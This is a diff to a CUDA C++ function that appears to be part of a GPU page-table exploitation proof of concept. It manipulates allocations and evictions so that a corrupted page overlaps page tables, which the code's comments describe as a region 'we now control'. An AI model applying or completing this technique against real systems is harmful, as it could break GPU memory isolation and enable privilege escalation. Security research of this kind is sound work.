@@ -26,9 +26,10 @@ second_PT_region (uint64_t num_alloc_init,
   uint64_t ERR_next_id = std::numeric_limits<uint64_t>::max ();
   uint64_t next_id = ERR_next_id;
   std::vector<uint8_t *> misc_ptrs;
+
+  // Similar process as firstRegion.cu
   for (uint64_t i = 0; i < num_alloc_init; i += 1)
     {
-      // Create free space for Page Table Region
       if (i == next_id)
         evict_from_device (region_ptrs[victim_id], ALLOC_SIZE);
 
@@ -39,6 +40,7 @@ second_PT_region (uint64_t num_alloc_init,
 
       misc_ptrs.push_back(temp);
 
+      // 511 as there already exist an entry when we first generated the previous 4KB PT.
       if (i < skip || i % 511 == 0)
         continue;
 
@@ -48,15 +50,18 @@ second_PT_region (uint64_t num_alloc_init,
         next_id = i + 508;
     }
 
+  // Depending on the position of the corrupted 64KB page in 2MB page,
+  // prefill to that point with 4KB pages.
   std::vector<uint8_t*> fourkb_pages;
   for (uint64_t i = 0; i < (((uint64_t)corrupted_ptr % (2L * 1024 * 1024)) / 4096) + 1; i += 1)
-  // for (uint64_t i = 0; i < 512 + 1; i += 1)
     {
       cudaMallocManaged (&temp, ALLOC_SIZE + 4096);
 
       double currentMS = time_data_access (temp + ALLOC_SIZE, 1);
       fourkb_pages.push_back(temp);
     }
+
+  /* Free up unused GPU/CPU memory by releasing the evicted memories */
   for (uint64_t i = 0; i < region_ptrs.size(); i += 1)
   {
     if (i != corrupted_id && region_ptrs[i] != nullptr)
@@ -69,6 +74,7 @@ second_PT_region (uint64_t num_alloc_init,
     gpuErrchk(cudaPeekAtLastError());
   }
 
+  /* Fill the PT region we now control with cudaMalloc'ed memory (non-evictable) */
   auto &cudaMalloced_ptrs = ctx.step4_data.cudaMalloced_ptrs;
   cudaMalloced_ptrs.resize(500);
   for (uint64_t i = 0; i < 500; i += 1)
@@ -77,11 +83,14 @@ second_PT_region (uint64_t num_alloc_init,
       memset_ptr<<<1,1>>>(cudaMalloced_ptrs[i], (uint64_t)cudaMalloced_ptrs[i], 8);
     }
   cudaDeviceSynchronize();
+
+  // Free other unused memory
   for (auto& ptr : fourkb_pages)
     cudaFree(ptr);
   for (auto ptr : agg_ptrs)
     cudaFree(ptr);
 
+  // Print out the PTEs we see of cudaMalloced_ptrs
   if (debug_enabled())
   {
     print_memory<<<1,1>>>(corrupted_ptr, 64 * 1024);
